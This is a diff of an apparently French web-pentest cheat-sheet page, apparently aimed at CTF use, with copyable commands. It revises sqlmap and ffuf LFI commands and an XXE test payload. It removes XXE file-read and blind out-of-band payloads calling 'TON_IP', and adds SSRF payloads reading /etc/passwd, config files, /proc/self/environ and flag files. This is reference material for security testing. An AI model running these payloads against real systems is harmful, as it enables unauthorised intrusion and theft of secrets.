@@ -46,7 +46,7 @@
         
         <div class="cmd-item">
             <div class="code-block">
-                <code>sqlmap -u "URL?id=1" --batch --risk 3 --level 5 --dbs</code>
+                <code>sqlmap -r request.txt --batch --risk 3 --level 5 --dbs</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -167,7 +167,7 @@
         
         <div class="cmd-item">
             <div class="code-block">
-                <code>ffuf -u "URL?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:x:"</code>
+                <code>ffuf -u "<span class="variable" data-var="url">URL</span>?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:x:"</code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -368,7 +368,15 @@
 
         <div class="cmd-item">
             <div class="code-block no-highlight">
-                <code>&lt;!DOCTYPE d [ &lt;!ENTITY test "XXE_VULN"&gt; ]&gt; ... &lt;tag&gt;&amp;test;&lt;/tag&gt;</code>
+                <code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [ &lt;!ELEMENT data ANY&gt;
+&lt;!ENTITY test "XXE"&gt;
+]&gt;
+    &lt;Contact&gt;
+        &lt;lastName>&test;&lt;/lastName&gt;
+        &lt;firstName>Timothée&lt;/firstName&gt;
+    &lt;/Contact&gt;
+                </code>
                 <button class="btn-copy" title="Copier la commande">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
@@ -376,33 +384,7 @@
                     </svg>
                 </button>
             </div>
-            <p class="cmd-description">Détection basique : si "XXE_VULN" s'affiche dans la réponse.</p>
-        </div>
-        
-        <div class="cmd-item">
-            <div class="code-block no-highlight">
-                <code>&lt;!DOCTYPE d [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt; ]&gt; ... &lt;tag&gt;&amp;xxe;&lt;/tag&gt;</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Lecture de fichier : Hostname (Linux) ou <code>file:///C:/windows/win.ini</code> (Windows)</p>
-        </div>
-        
-        <div class="cmd-item">
-            <div class="code-block no-highlight">
-                <code>&lt;!DOCTYPE d [ &lt;!ENTITY % remote SYSTEM "http://TON_IP/ping"&gt; %remote; ]&gt;</code>
-                <button class="btn-copy" title="Copier la commande">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                    </svg>
-                </button>
-            </div>
-            <p class="cmd-description">Détection aveugle : Vérifier la connexion entrante via <code>nc -lvnp 80</code>.</p>
+            <p class="cmd-description">Détection basique : si "XXE" s'affiche dans la réponse.</p>
         </div>
     </div>
 </div>
@@ -437,9 +419,9 @@
     </div>
     <div class="card-content">
         <p class="cmd-description">Cible : Formulaires/actions sensibles (changer email, mot de passe, supprimer compte)</p>
-        <p class="cmd-description">Action : Vérifier si les formulaires sensibles (password, email) ont un token unique (CSRF Token)</p>
+        <p class="cmd-description">Action : Vérifier si les formulaires sensibles (password, email) ont un token unique (CSRF Token), si il y a absence de <code>&lt;input type="hidden" name="csrf_token" ...&gt;</code> dans des formulaires POST c'est sûrement vulnérable </p>
         <div class="cmd-item">
-            <p class="cmd-description">Absence de <code>&lt;input type="hidden" name="csrf_token" ...&gt;</code> dans les formulaires POST</p>
+            <p class="cmd-description"></p>
         </div>
     </div>
 </div>
@@ -477,7 +459,97 @@
             <p class="cmd-description">Action : Tenter d'accéder à l'interface localhost ou des ports internes (22, 3306, 8080)</p>
         </div>
         <div class="code-block">
-            <code>?url=http://127.0.0.1:80</code>
+            <code>?url=http://127.0.0.1/admin</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///etc/passwd</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///etc/hosts</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///app/config.ini</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///var/www/html/config.php</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///etc/apache2/sites-enabled/000-default.conf</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///var/www/html/X_TARGET/settings.py</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///proc/self/environ</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///proc/self/cmdline</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///root/flag.txt</code>
+            <button class="btn-copy" title="Copier la commande">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </button>
+        </div>
+        <div class="code-block">
+            <code>?url=file:///C:/windows/win.ini</code>
             <button class="btn-copy" title="Copier la commande">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
